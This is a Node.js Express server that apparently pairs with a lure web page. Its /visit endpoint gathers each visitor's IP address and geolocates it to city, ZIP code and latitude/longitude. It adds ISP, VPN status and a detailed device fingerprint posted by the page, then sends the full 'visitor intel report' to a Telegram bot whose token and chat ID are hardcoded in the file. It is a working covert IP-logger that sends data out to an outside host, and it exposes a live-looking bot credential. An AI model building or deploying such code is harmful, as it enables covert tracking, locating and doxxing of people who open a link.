const express = require("express");
const path = require("path");
const app = express();
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";

async function sendTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
    });
  } catch (err) { console.log("Error sending to Telegram"); }
}

app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Fetch Full ISP Intel (fields=16777215 gets EVERYTHING)
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();

    const report = `
<b>🚀 FULL VISITOR INTEL REPORT (100% CAPTURE)</b>
-----------------------------------------
<b>🌐 IP & ISP DATA</b>
• <b>IP Address:</b> <code>${ip}</code>
• <b>ISP:</b> ${geo.isp}
• <b>Organization:</b> ${geo.org || "N/A"}
• <b>AS/Network:</b> ${geo.as}
• <b>Mobile Network:</b> ${geo.mobile ? "Yes 📱" : "No"}
• <b>Proxy/VPN:</b> ${geo.proxy ? "Detected ⚠️" : "No"}
• <b>Hosting/DC:</b> ${geo.hosting ? "Yes (Server/Bot)" : "No (User)"}

<b>📍 GEOGRAPHICAL INFO</b>
• <b>Country:</b> ${geo.country} (${geo.countryCode})
• <b>Region/City:</b> ${geo.regionName} / ${geo.city}
• <b>ZIP Code:</b> ${geo.zip}
• <b>Lat/Lon:</b> ${geo.lat}, ${geo.lon}
• <b>Timezone:</b> ${geo.timezone} (Client: ${client.browser?.tz})

<b>💻 HARDWARE FINGERPRINT</b>
• <b>GPU:</b> <code>${client.gpu}</code>
• <b>CPU Cores:</b> ${client.hw?.cores}
• <b>RAM:</b> ~${client.hw?.ram} GB
• <b>Platform:</b> ${client.hw?.platform}
• <b>Vendor:</b> ${client.hw?.vendor}
• <b>Resolution:</b> ${client.display?.res} (${client.display?.pixelRatio}x density)
• <b>Touchscreen:</b> ${client.hw?.touch > 0 ? "Yes (" + client.hw?.touch + " points)" : "No"}

<b>🔋 LIVE DEVICE STATUS</b>
• <b>Battery:</b> ${client.battery?.lvl || "N/A"} (${client.battery?.status || "N/A"})
• <b>Net Type:</b> ${client.net?.type || "N/A"} (Speed: ${client.net?.downlink || "N/A"})
• <b>Network Ping:</b> ${client.net?.rtt || "N/A"}

<b>🧠 BROWSER IDENTIFIER</b>
• <b>Languages:</b> ${client.browser?.lang}
• <b>Referrer:</b> ${client.browser?.ref}
• <b>Bot/Automation:</b> ${client.browser?.webdriver ? "True 🤖" : "False"}
• <b>User-Agent:</b> <code>${req.headers["user-agent"]}</code>

<b>⏰ LOGGED AT:</b> ${new Date().toUTCString()}
-----------------------------------------
`;

    await sendTelegram(report);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "failed" });
  }
});

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
